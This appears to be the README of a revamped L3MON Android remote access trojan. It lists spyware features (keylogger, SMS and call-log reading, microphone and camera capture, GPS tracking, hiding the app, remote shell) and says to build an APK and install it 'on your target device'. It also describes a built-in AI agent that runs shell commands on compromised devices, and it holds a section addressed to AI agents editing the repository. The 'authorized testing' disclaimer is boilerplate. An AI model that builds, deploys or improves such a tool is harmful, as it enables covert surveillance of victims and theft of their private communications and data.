<div align="center">

# 📱 L3MON RAT

**Remote Android Management Suite**

A cloud-powered Android administration platform built with Node.js, Express, and Socket.IO.

*Revamped by xTheDevilRazedMe*

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Node](https://img.shields.io/badge/node-14.x--18.x-brightgreen.svg)](https://nodejs.org)
[![Java](https://img.shields.io/badge/java-8-orange.svg)](https://www.oracle.com/java/technologies/javase-jdk8-downloads.html)

</div>

---

## ⚡ Features

| Category | Capabilities |
|----------|-------------|
| 📍 **Location** | Real-time GPS tracking, location history, map visualization |
| 📞 **Communication** | SMS reader/sender, call logs, contacts access |
| 🎤 **Surveillance** | Microphone recording, live mic streaming, camera capture |
| 📋 **Data** | Clipboard monitoring, notification logging, keylogger |
| 📁 **Files** | File browser, file download, app management |
| 🖥️ **Remote Control** | Shell terminal, Alpine Linux environment, package manager |
| 🔒 **Security** | Device admin, hide/show app, exploit recon & CVE scanning |
| 🤖 **AI Agent** | Built-in AI assistant with tool-calling capabilities |
| 📦 **Payload Builder** | Custom APK builder with tunnel support |
| 🔍 **Exploit Scanner** | NVD CVE database + searchsploit integration |
| 🐧 **Alpine Modules** | Deployable toolkits (nmap, ssh, python, etc.) |

---

## 🚀 Quick Start

### Prerequisites

- **Java 8** (JDK/JRE 1.8.0) — required for APK building
- **Node.js** 14.x–18.x LTS
- **npm**

### Installation

```bash
# Clone the repository
git clone https://github.com/your-repo/L3MON.git
cd L3MON

# Install dependencies
npm install

# Start the server
node index.js
```

### First Run

1. Open `http://localhost:22533` in your browser
2. Login with default credentials (check `maindb.json`)
3. Go to **Build Payload** to create your APK
4. Install the APK on your target device
5. Device appears on the dashboard automatically

---

## 🔧 Configuration

### Admin Credentials

Edit `maindb.json` to set your admin password:

```json
{
  "admin": {
    "username": "admin",
    "password": "5d41402abc4b2a76b9719d911017c592"
  }
}
```

Generate MD5 hash:
```bash
echo -n "YourPassword" | openssl md5 | awk '{print $2}'
```

### Ports

| Port | Purpose |
|------|---------|
| 22533 | Web dashboard |
| 22222 | Socket.IO (device connections) |

### Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `L3MON_TUNNEL` | Enable/disable tunnel | `true` |
| `L3MON_TUNNEL_SUBDOMAIN` | Custom tunnel subdomain | random |
| `L3MON_CLIENT_URL` | Override client connection URL | auto |

---

## 📂 Project Structure

```
L3MON/
├── index.js                 # Server entry point
├── maindb.json              # Database (users, clients, settings)
├── package.json             # Dependencies
├── includes/
│   ├── expressRoutes.js     # API routes & page handlers
│   ├── clientManager.js     # Device connection management
│   ├── const.js             # Configuration constants
│   ├── apkBuilder.js        # APK build & sign logic
│   ├── tunnelManager.js     # LocalTunnel management
│   ├── exploitScanner.js    # CVE scanner (NVD + searchsploit)
│   └── modules.js           # Alpine module store
├── assets/
│   ├── views/               # EJS templates
│   │   ├── index.ejs        # Dashboard
│   │   ├── builder.ejs      # APK builder
│   │   ├── logs.ejs         # Event log
│   │   ├── deviceManager.ejs # Device pages container
│   │   ├── deviceManagerPages/ # Individual device pages
│   │   └── partials/        # Header, sidebar, footer, AI panel
│   └── webpublic/           # Static assets (CSS, JS, images)
├── app/factory/             # APK templates & tools
├── clientData/              # Per-device data storage
├── README.md                # This file
└── CHANGELOG.md             # Version history
```

---

## 🛡️ Device Pages

| Page | Description |
|------|-------------|
| 📊 **Info** | Device details, system info, quick actions |
| 🖥️ **Terminal** | Remote shell access |
| 📍 **Location** | GPS tracking with map |
| 💬 **SMS** | Read & send SMS messages |
| 📞 **Calls** | Call log history |
| 👥 **Contacts** | Contact list |
| 📋 **Clipboard** | Clipboard history |
| 🎤 **Microphone** | Audio recording & live streaming |
| 📷 **Camera** | Photo capture |
| 🔑 **Keylogger** | Notification-based keylogger |
| 📁 **Files** | Remote file browser |
| 🐧 **Alpine** | Linux environment terminal |
| 📦 **Packages** | Alpine package manager |
| 🔍 **Exploits** | CVE scanner & exploit recon |
| 📶 **WiFi** | WiFi network scanner |
| 🔐 **Permissions** | App permissions viewer |
| 📱 **Apps** | Installed apps list |
| ⚙️ **Settings** | Device & global settings |

---

## 🤖 AI Agent

L3MON includes a built-in AI agent that can:

- Execute commands on devices (`/shell`, `/alpine`, `/recon`)
- Read stored device data
- List all connected devices
- Manage the platform

Configure in **Settings** or via the AI panel in the sidebar.

---

## 📦 Module Store

Deploy tools to the Alpine Linux environment:

| Module | Tools |
|--------|-------|
| 🔍 Network Scanning | nmap, netcat, socat |
| 🕵️ Recon Toolkit | curl, wget, dnsutils, whois, traceroute |
| 🔐 Reverse SSH | openssh, socat |
| 📶 WiFi Tools | wireless-tools, iw |
| 💻 Dev & Exploit | python3, gcc, musl-dev, make, git |
| 🔄 Proxychains | proxychains-ng, nmap |

---

## 📋 Changelog

See [CHANGELOG.md](CHANGELOG.md) for full version history.

> **Rule: Every change MUST be documented in the changelog before merging.**

| Version | Date | Highlights |
|---------|------|------------|
| 3.1.0 | Aug 12–13, 2026 | Full revamp: AI Agent, Dark Theme, Device Nicknames, Auto-Extraction |
| 3.0.0 | Original | Base L3MON from GitHub |

---

## 📋 Contributing Rule

> **Any AI agent reading, editing, or making changes to this repository MUST follow this process:**
>
> 1. **Log everything in [DEVLOG.md](DEVLOG.md)** — every file edit, every change, every fix
> 2. **Promote significant items to [CHANGELOG.md](CHANGELOG.md)** — only major features, fixes, and breaking changes
>
> **If an AI agent makes a change and doesn't log it, the change is incomplete.**

---

## ⚠️ Disclaimer

**This tool is for authorized security testing and educational purposes only.**

Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing. The developers are not responsible for any misuse of this software.

---

## 📄 License

MIT License — See [LICENSE](LICENSE) for details.

---

## 🙏 Credits

- **Original L3MON** by [D3VL](https://github.com/efxtv/L3MON)
- **Revamped by** xTheDevilRazedMe

---

<div align="center">

**Edited with ❤️ by xTheDevilRazedMe**

</div>
